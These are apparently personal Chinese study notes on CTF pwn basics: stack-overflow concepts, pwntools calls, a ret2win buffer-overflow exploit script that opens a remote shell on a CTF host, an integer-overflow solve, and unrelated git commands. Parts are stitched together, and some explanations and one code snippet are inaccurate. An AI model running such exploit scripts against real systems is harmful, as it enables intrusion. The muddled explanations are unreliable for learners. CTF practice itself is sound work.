##### 关于对栈溢出的理解

1. 在进行nc连接时，我们所连接的端口会执行程序，此时这个程序里的函数就会被执行，一般的主函数是`main`。这个主函数在程序里拥有被执行的权限，所以我们可以通过添加垃圾数据来填满`main`函数的执行主体，由于我们填充的垃圾数据无法被执行，所以在造成溢出后`main`函数被赋予的可执行权限依旧在。
2. 在构造payload造成溢出后，我们可以通过类`p64(地址)`来进行执行的地方。在64位程序里我们通常需要加入一个返回地址`p64(ret)`来使栈完成对齐（调整rsp），避免字节未对齐使程序崩溃。在32位的程序里这个地址这个返回地址较为宽松，只需要符合`0x0`格式就可以构成返回。
3. 造成溢出后指定执行地址一般是关键函数的开始地址，目前我所接触的大多数简单到入门题的关键函数是`win`、`printf_flag`、`backdoor`这类。有的则是直接进入控制台`/bin/sh`，接着通过`ls`、`cat`等指令来查询flag。	

##### 关于pwntools

1. `recvall()`

   * 这个命令的作用是读取程序执行后的输出内容，可以写成`recvall(timeout=3)`的形式，意思为读取程序执行后三秒内的输出数据。

2. `recvuntil（'字符串'）`

   * 这个命令的作用是接收数据直到包含指定字符串，下一行一般会跟`send()`，作为检测到这个字符串后随即发送的信息内容。

3. `recvline().strip(),16`

   * 这个命令我目前只在`recvuntil()`这个命令后见过，作用是存取在检测到字符串后的一定长度的输出内容，格式为：

     ```pytnon
     p.recvuntil(b'print: ')
     addr=int(p.recvuntil().strip(),16)
     ```

     此处的`addr`是将`recvuntil()`检测后后面的输出地址存入其中，`int`是确认存入类型，`16`是十六进制基数，`strip()`是去除首尾空白。

4. `sendlineafter()`

   * 在我目前的理解下我更感觉这是`sendline()`和`recvuntil()`的结合，它的用法是`sendlineafter('字符串'，输入内容)`。它会检测到这个字符串后进行主动发送。

  这里我们注意到是64位程序，且PIE（地址动态变化）没有开启，且No canary found（栈溢出保护未开启），所以我们考虑栈溢出的方法。

  接下来我们把文件丢到ida64中，观察反汇编(F5)的程序分析逻辑。

  根据ida的反汇编内容我们可以看到`main`函数，但是`main`函数不是重点，重点在`try`函数上。

  这里的`try`函数可以在`main`函数那里得到信息，有对应的执行逻辑显示。

  `try`函数的反汇编内容：

  ```c
  void __cdecl try()
  {
    char buffer[256]; // [rsp+0h] [rbp-100h] BYREF
  
    memset(buffer, 0, sizeof(buffer));
    puts("Now,Try to exploit it as I done and get the shell!");
    puts("Enter your input:");
    gets(buffer);
  }
  ```

  这里我们看到`buffer[256]`、`[rbp-100h]`得知我们可以进行溢出。再看两行`puts`后的提示可以得知出题人是希望我们利用这个`try`函数得到`shell`权限。所以我们继续观察，找到了名为`backd00r`的函数名，打开反汇编可以得到：

  ```c
  void __cdecl backd00r()
  {
    puts("Congratulations! You have found the backdoor!");
    puts("You can now execute any command you want.");
    system("/bin/sh");
  }
  ```

  这里我们注意到`system("/bin/sh")`，根据提示我们也知道里这就是出题人希望我们找到的地方，跳转执行权限的地方，这里我们需要查看地址，得到`backd00r`起始地址：`// starts at 401200`。

  于是我们就可以通过pwntools构造exp进行栈溢出。

  连接端口：

  ```python
  from pwn import *
  p=remote('docker.qingcen.net',38766)
  #ret=0x401233,backd00r=0x401200
  payload=b'A'*(0x100+8)+p64(0x401233)+p64(0x401200)
  p.sendline(payload)
  p.interactive()
  ```

  最终我们得到shell，`ls`查看目录，`cat flag`得到：

  ​							`flag{74d99c0a-70f5-45bb-8e4c-619f3246e757}`

  我们根据`main`函数的逻辑得到一个`func`函数，我们看到：

  ```c
  unsigned __int64 func()
  {
    __int16 v1; // [rsp+2h] [rbp-Eh]
    int v2; // [rsp+4h] [rbp-Ch] BYREF
    unsigned __int64 v3; // [rsp+8h] [rbp-8h]
  
    v3 = __readfsqword(0x28u);
    v1 = 0;
    while ( 1 )
    {
      v2 = 0;
      __isoc99_scanf(&unk_2008, &v2);
      if ( v2 <= 0 )
        break;
      if ( ++v1 < 0 )
      {
        puts("You got it!\n");
        system("cat flag");
      }
    }
    puts("You can only input positive number!\n");
    return v3 - __readfsqword(0x28u);
  ```

  我们可以看到这个明显的`cat flag`，需要满足`( ++v1 < 0 )`，这里之前它已经给v1赋值为0，int整型的范围我的印象是三万多，所以我们尝试直接多次发送`1`不断执行`while`循环，使`int`整型溢出为负值。v2和`cat flag `的执行没有多大关系，大概可能是出题人的误导，不过v2也不影响是真的，它v2的赋值0在`while`里面，每次循环都会被重新执行，更何况后面对它的0值根本没改变。

  这里我们编写脚本：

  ```python
  from pwn import *
  p=remote('docker.qingcen.net',49673)
  payload=b'1'*40000
  p.send(payload)
  p.interactive()
  ```

  由于我直接输了四万个`1`，它这边直接给我打了一堆，正常来说只要打多一个范围就行。

  flag：`flag{94044ee7-94cc-4b35-a40d-5019c770f648}`。

  这个就是用`int`在`c`里面的漏洞了。

#### 通常管理的模式有三个主要区域：工作区、暂存区、历史记录（commit）。

工作区就是我们正常的文件夹目录。

暂存区是暂时存储的通道。

历史记录就是git保存的历史痕迹。

顺序三者依次进行。

- 工作区转入暂存区

  ```cmd
  git add 文件名
  ```

- 暂存区转入历史记录（commit）

  ```cmd
  git commit -m 
  ```

- 设置姓名和邮箱，这个是一次的，之后其它文件夹使用git也是这个姓名和邮箱

  ```cmd
  git config --global user.name "姓名"
  git config --global user.email "邮箱"
  ```

#### 关于回滚，类似撤回的操作

在这个方面git的指令主要根据以上三个区域设计。

- ###### 工作区（指在文件夹目录对文件本体的修改）

  ```cmd
  git diff //查看修改内容，查看下一行'j'，上一行'k'，下一页'f'，上一页'b'。、
  git restore //撤销工作区的改动内容，后面直接加文件名，也可以'.'来直接撤销目录下所有文件的修改。
  ```

- ###### 暂存区

  ```cmd
  git restore --staged
  ```

- ###### 历史记录（commit）

  ```cmd
  git reset --hard HEAD~1 //三个区域全部回滚覆盖
  git reset --mixed HEAD~1 //只保留工作区
  git reset --soft HEAD~1 //只回滚覆盖历史记录（'commit'）
  git reset HEAD //默认执行'--mixed'。
  ```

  以上页面通过`.wp`或`q`退出。

  此处的`HEAD`在log日志里展示，类似`c`语言的数组排序，顺序为`HEAD`、`HEAD~1`、`HEAD~2`，且会以最新的为头部`HEAD`，也就是每个历史记录的标志会改变。
